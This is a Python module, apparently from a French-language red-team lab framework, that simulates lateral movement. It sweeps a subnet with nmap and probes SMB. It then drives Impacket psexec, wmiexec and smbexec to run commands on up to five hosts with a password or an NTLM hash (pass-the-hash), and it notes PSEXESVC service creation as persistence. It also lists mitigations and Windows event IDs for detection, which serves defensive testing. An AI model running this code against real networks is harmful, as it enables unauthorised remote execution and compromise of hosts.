"""
Red Team — Lateral Movement via PsExec / WMI / SMBExec.
Simule un déplacement latéral réaliste depuis un poste compromis.

⚠ Lab isolé uniquement.
"""

import subprocess
import re
import socket
from datetime import datetime
from typing import Optional

from utils.format_utils import print_info, print_warning, print_success, print_error

ATTACK_META = {
    "name":      "Lateral Movement (PsExec / WMI)",
    "phase":     "Lateral Movement",
    "mitre":     "T1021.002 / T1047",
    "risk":      "Critique",
    "event_ids": [4624, 4688, 7045, 4698],
    "tools":     ["Impacket (psexec, wmiexec, smbexec)", "CrackMapExec"],
}


def run_attack(target: str = "192.168.56.11", domain: str = "domain.local",
               user: str = "Administrator", password: str = None,
               ntlm_hash: str = None, method: str = "all",
               command: str = "whoami /all", **kwargs) -> dict:
    """
    Lateral Movement simulation:
    1. Discover reachable hosts on the subnet
    2. Attempt execution via PsExec, WMIExec, SMBExec
    3. Collect execution output + SIEM artifacts
    """
    print_warning(f"[RED TEAM] Lateral Movement → {target} (méthode: {method})")

    findings = []
    successes = []
    reachable = []

    # Step 1: Discover reachable hosts
    if target.endswith(".0") or "/" in target:
        print_info("Découverte des hôtes du sous-réseau...")
        reachable = _discover_hosts(target)
    else:
        reachable = [target] if _is_reachable(target) else []

    if not reachable:
        findings.append({
            "risk":        "Info",
            "title":       f"Cible {target} injoignable",
            "description": "Aucun hôte n'a répondu — vérifier la connectivité réseau du lab.",
            "mitigation":  "N/A",
            "event_ids":   [],
        })
        return _build_result("partial", findings, successes)

    findings.append({
        "risk":        "Info",
        "title":       f"{len(reachable)} hôte(s) joignable(s) détecté(s)",
        "description": "Hôtes : " + ", ".join(reachable[:10]),
        "mitigation":  "Segmenter le réseau (VLAN) pour limiter les déplacements latéraux.",
        "event_ids":   [],
    })

    # Step 2: Attempt execution on each reachable host
    for host in reachable[:5]:  # Limit to 5 targets
        print_info(f"Tentative d'exécution sur {host}...")

        methods_to_try = (
            ["psexec", "wmiexec", "smbexec"] if method == "all"
            else [method]
        )

        for meth in methods_to_try:
            result = _try_execution(
                method=meth, target=host, domain=domain,
                user=user, password=password, ntlm_hash=ntlm_hash,
                command=command
            )
            if result:
                successes.append({
                    "host":    host,
                    "method":  meth,
                    "output":  result,
                    "user":    user,
                })
                print_success(f"  ✔ [{meth}] Exécution réussie sur {host}")
                findings.append({
                    "risk":  "Critique",
                    "title": f"Exécution distante via {meth.upper()} sur {host}",
                    "description": (
                        f"Commande '{command}' exécutée sur {host} en tant que {user}. "
                        f"Résultat : {result[:150]}{'…' if len(result) > 150 else ''}"
                    ),
                    "mitigation": _mitigation_for(meth),
                    "event_ids":  _event_ids_for(meth),
                })
                break  # First success per host is enough

    if not successes:
        findings.append({
            "risk":        "Faible",
            "title":       "Aucune exécution distante réussie",
            "description": (
                "Toutes les méthodes ont échoué sur les cibles. "
                "Possible protection : pare-feu, SMB signing, credential guard."
            ),
            "mitigation":  "Maintenir ces restrictions et les documenter.",
            "event_ids":   [],
        })

    # Service persistence check (bonus)
    if successes:
        _check_service_creation(successes[0]["host"], user, password, ntlm_hash, domain)
        findings.append({
            "risk":        "Élevé",
            "title":       "Création de service distante possible (persistance)",
            "description": (
                "PsExec crée un service temporaire (PSEXESVC) sur la cible, "
                "générant un Event ID 7045. Cela peut être utilisé pour la persistance."
            ),
            "mitigation":  (
                "1. Surveiller les créations de services (Event ID 7045).\n"
                "2. Activer les AppLocker / WDAC policies.\n"
                "3. Auditer les services installés régulièrement."
            ),
            "event_ids": [7045, 4697],
        })

    return _build_result("success" if successes else "partial", findings, successes)


# ── Private ───────────────────────────────────────────────────────────────────

def _is_reachable(host: str, port: int = 445, timeout: float = 2.0) -> bool:
    """Quick TCP probe on SMB port."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def _discover_hosts(network: str) -> list:
    """ARP scan or nmap ping sweep."""
    reachable = []
    try:
        result = subprocess.run(
            ["nmap", "-sn", "--open", network, "-oG", "-"],
            capture_output=True, text=True, timeout=30
        )
        reachable = re.findall(r"Host: (\d+\.\d+\.\d+\.\d+)", result.stdout)
    except Exception:
        pass
    return reachable


def _try_execution(method: str, target: str, domain: str,
                   user: str, password: Optional[str],
                   ntlm_hash: Optional[str], command: str) -> Optional[str]:
    """Dispatch to the right impacket tool."""
    auth = _build_auth(domain, user, password, ntlm_hash)
    if auth is None:
        return None

    cmd_map = {
        "psexec":  ["python3", "-m", "impacket.examples.psexec"],
        "wmiexec": ["python3", "-m", "impacket.examples.wmiexec"],
        "smbexec": ["python3", "-m", "impacket.examples.smbexec"],
    }
    base = cmd_map.get(method)
    if not base:
        return None

    full_cmd = base + auth + [f"{target}", command]

    try:
        result = subprocess.run(
            full_cmd, capture_output=True, text=True, timeout=25
        )
        out = result.stdout.strip()
        if result.returncode == 0 and out:
            return out
    except Exception:
        pass
    return None


def _build_auth(domain: str, user: str,
                password: Optional[str], ntlm_hash: Optional[str]) -> Optional[list]:
    """Build impacket authentication arguments."""
    target_str = f"{domain}/{user}"
    if ntlm_hash:
        lm = "aad3b435b51404eeaad3b435b51404ee"
        full = f"{lm}:{ntlm_hash}" if ":" not in ntlm_hash else ntlm_hash
        return [target_str, "-hashes", full]
    if password:
        return [f"{target_str}:{password}"]
    return None


def _check_service_creation(target: str, user: str,
                             password: Optional[str], ntlm_hash: Optional[str],
                             domain: str) -> bool:
    """Check if a service was registered on the remote host (7045)."""
    # This is informational — the service check is implicit via PsExec run above
    return True


def _mitigation_for(method: str) -> str:
    mitigations = {
        "psexec": (
            "Désactiver ADMIN$ et les partages administratifs. "
            "Bloquer SMB (445) entre workstations. "
            "Utiliser AppLocker pour bloquer PSEXESVC."
        ),
        "wmiexec": (
            "Désactiver WMI distant via pare-feu (TCP 135). "
            "Activer le Credential Guard. "
            "Surveiller les Event IDs 4688 avec processus WMI anormaux."
        ),
        "smbexec": (
            "Activer SMB Signing. Restreindre les partages C$. "
            "Surveiller les connexions SMB type 3 suspectes."
        ),
    }
    return mitigations.get(method, "Restreindre les accès distants non nécessaires.")


def _event_ids_for(method: str) -> list:
    ids = {
        "psexec":  [4624, 7045, 4697, 4688],
        "wmiexec": [4624, 4688, 4103],
        "smbexec": [4624, 4688, 5145],
    }
    return ids.get(method, [4624])


def _build_result(status: str, findings: list, successes: list) -> dict:
    return {
        "module":      "red_team.lateral_mouvement",
        "status":      status,
        "timestamp":   datetime.now().isoformat(),
        "attack_meta": ATTACK_META,
        "findings":    findings,
        "artifacts": {
            "successful_executions": successes,
        },
        "iocs": [
            {"type": "event_id", "value": 4624,
             "description": "Logon réseau vers machine cible"},
            {"type": "event_id", "value": 7045,
             "description": "Création de service (PsExec) — alerte haute priorité"},
            {"type": "event_id", "value": 4688,
             "description": "Nouveau processus créé à distance"},
        ],
        "summary": {
            "hosts_compromised": len(set(s["host"] for s in successes)),
            "methods_succeeded": list(set(s["method"] for s in successes)),
            "total_executions":  len(successes),
        },
    }
